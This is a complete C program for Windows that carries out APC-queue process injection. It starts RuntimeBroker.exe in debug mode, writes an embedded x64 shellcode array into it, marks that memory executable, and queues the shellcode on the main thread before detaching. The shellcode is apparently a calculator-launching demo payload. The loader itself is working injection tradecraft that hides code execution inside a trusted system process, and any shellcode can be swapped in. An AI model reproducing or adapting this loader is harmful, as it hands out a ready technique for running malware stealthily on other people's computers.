#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>


#define TARGET_PROCESS "RuntimeBroker.exe"

//STEPS TO FOLLOW:
/*

1. Create a remote suspended OR debugged process, and return a handle to the process' main thread.
2. Allocate memory in the process' virtual address space and copy the shellcode into there
3. Queue an APC function (in this case simply the base of the shellcode) to the process' main thread.
4. Either unsuspend the process or remove the local process from it as a debugger if that method is being done

*/

unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};


BOOL createDebuggedProcess(OUT HANDLE* procHandle, OUT DWORD* PID, OUT HANDLE* mainThreadHandle) {
	
	CHAR path[MAX_PATH * 2]; //buffer for file path to process
	CHAR WINDIR[MAX_PATH];

	STARTUPINFO startupInfo = { 0 }; //struct for storing information about the process' startup
	PROCESS_INFORMATION procInfo = { 0 }; //struct for useful process shit
	
	//get WINDIR env variable, this will contain the installation path of windows, which in turn has notepad.exe
	if (!GetEnvironmentVariableA("WINDIR", WINDIR, MAX_PATH)) {
		printf("GetEnvironmentVariable failed with: %d", GetLastError()); return FALSE;
	}

	sprintf(path, "%s\\System32\\%s", WINDIR, TARGET_PROCESS);

	if (!CreateProcessA(
		NULL,
		path,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,
		NULL,
		NULL,
		&startupInfo,
		&procInfo
	)) {
		printf("CreateProcessA failed with: %d", GetLastError()); return FALSE;
	}

	*procHandle = procInfo.hProcess;
	*PID = procInfo.dwProcessId;
	*mainThreadHandle = procInfo.hThread;

	if (*procHandle == NULL || *PID == NULL || *mainThreadHandle == NULL) {
		printf("One or more OUT parameters returned NULL."); return FALSE;
	}

	return TRUE;
}


BOOL writePayloadToMemory(IN HANDLE pHandle, IN PBYTE Payload, IN SIZE_T payloadSize, OUT PVOID* pBaseAddr) {

	*pBaseAddr = VirtualAllocEx(pHandle, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*pBaseAddr == NULL) {
		printf("Virtual Page Creation failed.\n"); return FALSE;
	}

	if (!WriteProcessMemory(pHandle, *pBaseAddr, Payload, payloadSize, NULL)) {
		printf("WriteProcessMemory failed: %d", GetLastError()); return FALSE;
	}

	DWORD oldProtect = NULL;
	if (!VirtualProtectEx(pHandle, *pBaseAddr, payloadSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		printf("VirtualProtectEx failed: %d", GetLastError()); return FALSE;
	}

	return TRUE;
}



int main() {

	HANDLE pHandle = NULL;
	HANDLE tHandle = NULL; //main thread handle
	DWORD PID = NULL;

	if (!createDebuggedProcess(&pHandle, &PID, &tHandle)) {
		return -1;
	}
	printf("Created process of PID: %d\n\n", PID);

	PVOID baseAddr = NULL;
	if (!writePayloadToMemory(pHandle, Payload, sizeof(Payload), &baseAddr)) {
		return -1;
	}


	//Queue userAPC to main thread
	if (!QueueUserAPC((PAPCFUNC)baseAddr, tHandle, NULL)) {
		printf("QueueUserApc failed: %d", GetLastError()); return -1;
	}
	DebugActiveProcessStop(PID); //Stop the debugging process, thus running the payload.

	printf("Press ENTER to exit.\n");
	getchar();


	CloseHandle(pHandle);
	CloseHandle(tHandle);
	return 0;
}